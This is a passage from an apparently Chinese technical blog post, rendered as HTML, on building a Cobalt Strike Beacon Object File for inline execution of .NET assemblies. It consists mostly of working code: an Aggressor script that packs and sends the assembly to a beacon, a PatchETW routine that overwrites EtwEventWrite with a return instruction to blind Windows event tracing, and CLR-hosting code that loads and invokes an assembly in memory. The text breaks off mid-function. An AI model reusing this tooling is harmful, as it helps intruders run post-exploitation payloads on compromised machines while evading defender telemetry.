&lt; size(@<span class="keyword">args</span>) ; <span class="variable">$i</span>++)&#123;</div><div class="line">		<span class="keyword">if</span> (@<span class="keyword">args</span>[<span class="variable">$i</span>] <span class="keyword">eq</span> <span class="string">"--AssemblyPath"</span>)&#123;</div><div class="line">			<span class="keyword">if</span>(@<span class="keyword">args</span>[<span class="variable">$i</span> + 1] ne <span class="string">""</span>)&#123;</div><div class="line">				<span class="variable">$AssemblyPath</span> = @<span class="keyword">args</span>[<span class="variable">$i</span> + 1];</div><div class="line">				#println(<span class="variable">$AssemblyPath</span>);</div><div class="line">			&#125;</div><div class="line">			</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (@<span class="keyword">args</span>[<span class="variable">$i</span>] <span class="keyword">eq</span> <span class="string">"--AssemblyArgs"</span>)&#123;</div><div class="line">			<span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$i</span> + 1; <span class="variable">$j</span> &lt; size(@<span class="keyword">args</span>) ; <span class="variable">$j</span>++)&#123;</div><div class="line">				<span class="keyword">if</span>(@<span class="keyword">args</span>[<span class="variable">$j</span>] <span class="keyword">in</span> @Optional)&#123;</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="variable">$AssemblyArgs</span>) == 0)&#123;</div><div class="line">					<span class="variable">$AssemblyArgs</span> = @<span class="keyword">args</span>[<span class="variable">$j</span>]</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">else</span>&#123;</div><div class="line">					<span class="variable">$AssemblyArgs</span> = <span class="variable">$AssemblyArgs</span>.<span class="string">" "</span>.@<span class="keyword">args</span>[<span class="variable">$j</span>];</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			#println(<span class="variable">$AssemblyArgs</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	# charge AssemblyPath is invaid</div><div class="line">	<span class="keyword">if</span>(<span class="variable">$AssemblyPath</span> <span class="keyword">eq</span> <span class="string">""</span> || !-exists <span class="variable">$AssemblyPath</span> || !-isFile <span class="variable">$AssemblyPath</span>)&#123;</div><div class="line">		println(<span class="variable">$AssemblyPath</span>.<span class="string">" is vailed or does not exist\n"</span>);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line">    </div><div class="line">    # <span class="keyword">read</span> .<span class="keyword">Net</span></div><div class="line">	<span class="variable">$AssemblyHandle</span> = openf(<span class="variable">$AssemblyPath</span>);</div><div class="line">	<span class="variable">$AssemblyLength</span> = lof(<span class="variable">$AssemblyPath</span>);</div><div class="line">	<span class="variable">$AssemblyBytes</span> = readb(<span class="variable">$AssemblyHandle</span> , -1);</div><div class="line">	closef(<span class="variable">$AssemblyHandle</span>);</div><div class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="variable">$AssemblyBytes</span>) == 0)&#123;</div><div class="line">		println(<span class="variable">$AssemblyPath</span>.<span class="string">"load failed \n"</span>);</div><div class="line">	&#125;</div><div class="line">	println(<span class="string">"size of .Net is: "</span>.<span class="variable">$AssemblyLength</span>);</div><div class="line"></div><div class="line">	# load bof</div><div class="line">	<span class="variable">$barch</span>  = barch(<span class="variable">$1</span>);</div><div class="line">	<span class="variable">$BofPath</span> = script_resource(<span class="string">"InlineExecute_Assembly_ $+ $barch $+ .obj"</span>);</div><div class="line">	</div><div class="line">	<span class="variable">$BofHandle</span> = openf(<span class="variable">$BofPath</span>);</div><div class="line">	<span class="variable">$BofBytes</span> = readb(<span class="variable">$BofHandle</span>, -1);</div><div class="line">	closef(<span class="variable">$BofHandle</span>);</div><div class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="variable">$BofBytes</span>) == 0)&#123;</div><div class="line">		println(<span class="variable">$BofPath</span>.<span class="string">" load failed \n"</span>);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line">	println(<span class="string">"bof file path is: "</span>.<span class="variable">$BofPath</span>);</div><div class="line">	println(<span class="string">"size of bof file is:"</span>.lof(<span class="variable">$BofPath</span>));</div><div class="line"></div><div class="line">	println(<span class="string">"args is:"</span>.<span class="variable">$AssemblyArgs</span>);</div><div class="line">	<span class="variable">$bofArgs</span> = bof_pack(<span class="variable">$1</span>, <span class="string">"biz"</span>,  <span class="variable">$AssemblyBytes</span> , <span class="variable">$AssemblyLength</span> , <span class="variable">$AssemblyArgs</span>);</div><div class="line">	#<span class="variable">$bofArgs</span> = bof_pack(<span class="variable">$1</span>, <span class="string">"zi"</span>,  <span class="variable">$BofPath</span> , <span class="variable">$AssemblyLength</span>);</div><div class="line">	btask(<span class="variable">$1</span>, <span class="string">"Running Inline_Execute Assembly BOF"</span>);</div><div class="line">	beacon_inline_execute(<span class="variable">$1</span>, <span class="variable">$BofBytes</span>, <span class="string">"go"</span>, <span class="variable">$bofArgs</span>);</div><div class="line"></div><div class="line">	<span class="keyword">clear</span>(@Optional);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x3-2-BOF编写"><a href="#0x3-2-BOF编写" class="headerlink" title="0x3.2 BOF编写"></a>0x3.2 BOF编写</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOF主要需要实现两个点，第一实现ByPass ETW，第二需要实现Assembly加载。先看官方给的例子。首先使用<code>BeaconDataParse</code>解析参数，然后调用<code>BeaconDataExtract</code>和<code>BeaconDataInt</code>依次获取string类型和int类型。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BeaconDataParse(<span class="name">&amp;parser</span>, args, length)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"beacon.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">demo</span><span class="params">(<span class="keyword">char</span> * args, <span class="keyword">int</span> length)</span> </span>&#123;</div><div class="line">	datap  parser;</div><div class="line">	<span class="keyword">char</span> * str_arg;</div><div class="line">	<span class="keyword">int</span>    num_arg;</div><div class="line">	</div><div class="line">	BeaconDataParse(&amp;parser, args, length);</div><div class="line">	str_arg = BeaconDataExtract(&amp;parser, <span class="literal">NULL</span>);</div><div class="line">	num_arg = BeaconDataInt(&amp;parser);</div><div class="line">	</div><div class="line">	BeaconPrintf(CALLBACK_OUTPUT, <span class="string">"Message is %s with %d arg"</span>, str_arg, num_arg);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中Bypass ETW原理很简单，只需要Patch <code>EtwEventWrite</code>或者<code>EtwEventWriteFull</code>函数，而Assembly Load就是上面所描述的四个步骤即可。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#include <span class="meta-string">"InlineExecute_Assembly.h"</span></span></div><div class="line"><span class="meta">#include <span class="meta-string">"beacon.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#define STATUS_SUCCESS 0</span></div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> PatchETW()</div><div class="line">&#123;</div><div class="line">	LPVOID pEtwEventWrite = KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA(<span class="string">"ntdll.dll"</span>), <span class="string">"EtwEventWrite"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (pEtwEventWrite == <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] pEtwEventWrite Failed"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] pEtwEventWrite Success"</span>);</div><div class="line"></div><div class="line">	DWORD oldProtect;</div><div class="line"></div><div class="line"><span class="meta">#ifdef _M_AMD64</span></div><div class="line">	SIZE_T length = <span class="number">1</span>;</div><div class="line">	<span class="keyword">char</span> patch[] = &#123; <span class="number">0xc3</span> &#125;;</div><div class="line"><span class="meta">#elif defined(_M_IX86)</span></div><div class="line">	SIZE_T length = <span class="number">3</span>;</div><div class="line">	<span class="keyword">char</span> patch[] = &#123; <span class="number">0xc2</span>,<span class="number">0x14</span>,<span class="number">0x00</span> &#125;;</div><div class="line"><span class="meta">#endif</span></div><div class="line"></div><div class="line">	NTSTATUS ntStatus = STATUS_SUCCESS;</div><div class="line">	HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">TRUE</span>, KERNEL32$GetCurrentProcessId());</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] OpenProcess Success"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (KERNEL32$VirtualProtectEx(hProcess, pEtwEventWrite, length, PAGE_EXECUTE_READWRITE, &amp;oldProtect) == <span class="literal">FALSE</span>)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] VirtualProtectEx Failed"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] VirtualProtectEx Success"</span>);</div><div class="line"></div><div class="line">	SIZE_T NumberOfBytesWritten = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (KERNEL32$WriteProcessMemory(hProcess, pEtwEventWrite, patch, length, &amp;NumberOfBytesWritten) == <span class="literal">FALSE</span>)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] WriteProcessMemory Failed"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] WriteProcessMemory Success"</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (KERNEL32$VirtualProtectEx(hProcess, pEtwEventWrite, length, oldProtect, &amp;oldProtect) == <span class="literal">FALSE</span>)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] VirtualProtectEx Failed"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] VirtualProtectEx Success"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="literal">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> FindVersion(<span class="keyword">char</span>* AssemblyBytes, <span class="keyword">int</span> dwLength)</div><div class="line">&#123;</div><div class="line">	<span class="built_in">BOOL</span> flag = <span class="literal">TRUE</span>;</div><div class="line">	<span class="keyword">char</span> v4[] = &#123; <span class="number">0x76</span>,<span class="number">0x34</span>,<span class="number">0x2E</span>,<span class="number">0x30</span>,<span class="number">0x2E</span>,<span class="number">0x33</span>,<span class="number">0x30</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,<span class="number">0x39</span> &#125;;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwLength; i++)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> (MSVCRT$memcmp(AssemblyBytes, v4, <span class="number">10</span>) == <span class="number">0</span>)</div><div class="line">		&#123;</div><div class="line">			flag = <span class="literal">TRUE</span>;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> flag;</div><div class="line">	<span class="comment">//int count = 0;</span></div><div class="line">	<span class="comment">//for (int i = 0; i &lt; dwLength; i++)</span></div><div class="line">	<span class="comment">//&#123;</span></div><div class="line">	<span class="comment">//	for (int j = 0; j &lt; 10; j++)</span></div><div class="line">	<span class="comment">//	&#123;</span></div><div class="line">	<span class="comment">//		if (AssemblyBytes[i] == v4[j])</span></div><div class="line">	<span class="comment">//		&#123;</span></div><div class="line">	<span class="comment">//			count++;</span></div><div class="line">	<span class="comment">//		&#125;</span></div><div class="line">	<span class="comment">//	&#125;</span></div><div class="line">	<span class="comment">//	if (count == 10)</span></div><div class="line">	<span class="comment">//	&#123;</span></div><div class="line">	<span class="comment">//		flag = TRUE;</span></div><div class="line">	<span class="comment">//		break;</span></div><div class="line">	<span class="comment">//	&#125;</span></div><div class="line">	<span class="comment">//	count = 0;</span></div><div class="line">	<span class="comment">//	</span></div><div class="line">	<span class="comment">//&#125;</span></div><div class="line">	<span class="comment">//return flag;</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">BOOL</span> AssemblyLoad(<span class="keyword">wchar_t</span>* wNetVersion , <span class="keyword">char</span>* AssemblyBytes , DWORD AssemblyLength, LPWSTR* ArgumentsArray, <span class="keyword">int</span> NumArguments)</div><div class="line">&#123;</div><div class="line">	HRESULT hr;</div><div class="line">	ICLRMetaHost* iMetaHost = <span class="literal">NULL</span>;</div><div class="line">	ICLRRuntimeInfo* iRuntimeInfo = <span class="literal">NULL</span>;</div><div class="line">	ICorRuntimeHost* iRuntimeHost = <span class="literal">NULL</span>;</div><div class="line">	IUnknown* pAppDomain = <span class="literal">NULL</span>;</div><div class="line">	AppDomain* pDefaultAppDomain = <span class="literal">NULL</span>;</div><div class="line">	Assembly* pAssembly = <span class="literal">NULL</span>;</div><div class="line">	MethodInfo* pMethodInfo = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">	SAFEARRAYBOUND saBound[<span class="number">1</span>];</div><div class="line">	<span class="keyword">void</span>* pData = <span class="literal">NULL</span>;</div><div class="line">	VARIANT vRet;</div><div class="line">	VARIANT vObj;</div><div class="line">	VARIANT vPsa;</div><div class="line">	SAFEARRAY* args = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">	hr = MSCOREE$<span class="built_in">CLRCreateInstance</span>(&amp;xCLSID_CLRMetaHost, &amp;xIID_ICLRMetaHost, (VOID**)&amp;iMetaHost);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] CLRCreateInstance Failed:%d"</span>,hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] CLRCreateInstance Success"</span>);</div><div class="line"></div><div class="line"></div><div class="line">	hr = iMetaHost-&gt;lpVtbl-&gt;GetRuntime(iMetaHost, wNetVersion, &amp;xIID_ICLRRuntimeInfo, (VOID**)&amp;iRuntimeInfo);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!] GetRuntime Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] GetRuntime Success"</span>);</div><div class="line"></div><div class="line">	hr = iRuntimeInfo-&gt;lpVtbl-&gt;GetInterface(iRuntimeInfo,&amp;xCLSID_CorRuntimeHost, &amp;xIID_ICorRuntimeHost, (VOID**)&amp;iRuntimeHost);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]GetInterface Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] GetInterface Success"</span>);</div><div class="line"></div><div class="line">	hr = iRuntimeHost-&gt;lpVtbl-&gt;Start(iRuntimeHost);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]CLR Start Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] CLR Start Success"</span>);</div><div class="line"></div><div class="line"></div><div class="line">	<span class="comment">//hr = iRuntimeHost-&gt;lpVtbl-&gt;GetDefaultDomain(iRuntimeHost,&amp;pAppDomain);</span></div><div class="line">	hr = iRuntimeHost-&gt;lpVtbl-&gt;CreateDomain(iRuntimeHost, (LPCWSTR)L<span class="string">" "</span>, <span class="literal">NULL</span>, &amp;pAppDomain);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]GetDefaultDomain Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] GetDefaultDomain Success"</span>);</div><div class="line"></div><div class="line"></div><div class="line">	hr = pAppDomain-&gt;lpVtbl-&gt;QueryInterface(pAppDomain, &amp;xIID_AppDomain, (VOID**)&amp;pDefaultAppDomain);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]QueryInterface Failed:%p"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] QueryInterface Success"</span>);</div><div class="line"></div><div class="line">	saBound[<span class="number">0</span>].cElements = AssemblyLength;</div><div class="line">	saBound[<span class="number">0</span>].lLbound = <span class="number">0</span>;</div><div class="line">	SAFEARRAY* pSafeArray = OLEAUT32$SafeArrayCreate(VT_UI1, <span class="number">1</span>, saBound);</div><div class="line">	<span class="keyword">if</span> (pSafeArray == <span class="literal">NULL</span>)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]SafeArrayCreate Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+]SafeArrayCreate Success"</span>);</div><div class="line"></div><div class="line">	hr = OLEAUT32$SafeArrayAccessData(pSafeArray, &amp;pData);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]SafeArrayAccessData Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] SafeArrayAccessData Success"</span>);</div><div class="line"></div><div class="line">	MSVCRT$memcpy(pData, AssemblyBytes, AssemblyLength);</div><div class="line"></div><div class="line">	hr = OLEAUT32$SafeArrayUnaccessData(pSafeArray);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]SafeArrayUnaccessData Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] SafeArrayUnaccessData Success"</span>);</div><div class="line"></div><div class="line">	hr = pDefaultAppDomain-&gt;lpVtbl-&gt;Load_3(pDefaultAppDomain,pSafeArray, &amp;pAssembly);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]Load_3 Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] Load_3 Success"</span>);</div><div class="line"></div><div class="line">	hr = pAssembly-&gt;lpVtbl-&gt;EntryPoint(pAssembly,&amp;pMethodInfo);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]EntryPoint Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] EntryPoint Success"</span>);</div><div class="line"></div><div class="line">	MSVCRT$memset(&amp;vRet, <span class="number">0</span>, <span class="keyword">sizeof</span>(VARIANT));</div><div class="line">	MSVCRT$memset(&amp;vObj, <span class="number">0</span>, <span class="keyword">sizeof</span>(VARIANT));</div><div class="line">	vObj.vt = VT_NULL;</div><div class="line">	vPsa.vt = (VT_ARRAY | VT_BSTR);</div><div class="line">	args = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, <span class="number">0</span>, <span class="number">1</span>);</div><div class="line">	<span class="keyword">if</span> (NumArguments &gt; <span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		vPsa.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, <span class="number">0</span>, NumArguments);</div><div class="line">		<span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; NumArguments; i++)</div><div class="line">		&#123;</div><div class="line">			OLEAUT32$SafeArrayPutElement(vPsa.parray, &amp;i, OLEAUT32$SysAllocString(ArgumentsArray[i]));</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">long</span> idx[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">		OLEAUT32$SafeArrayPutElement(args, idx, &amp;vPsa);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	hr = pMethodInfo-&gt;lpVtbl-&gt;Invoke_3(pMethodInfo,vObj, args, &amp;vRet);</div><div class="line">	<span class="keyword">if</span> (hr != ERROR_SUCCESS)</div><div class="line">	&#123;</div><div class="line">		BeaconPrintf(<span class="built_in">CALLBACK_ERROR</span>, <span class="string">"[!]Invoke Failed:%d"</span>, hr);</div><div class="line">		<span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">	&#125;</div><div class="line">	BeaconPrintf(<span class="built_in">CALLBACK_OUTPUT</span>, <span class="string">"[+] Invoke Success"</span>);</div><div class="line"></div><div class="line">	pMethodInfo-&gt;lpVtbl-&gt;Release(pMethodInfo);</div><div class="line">	pAssembly-&gt;lpVtbl-&gt;Release(pAssembly);</div><div class="line">	pDefaultAppDomain-&gt;lpVtbl-&gt;Release(pDefaultAppDomain);</div><div class="line">	iRuntimeInfo-&gt;lpVtbl-&gt;Release(iRuntimeInfo);</div><div class="line">	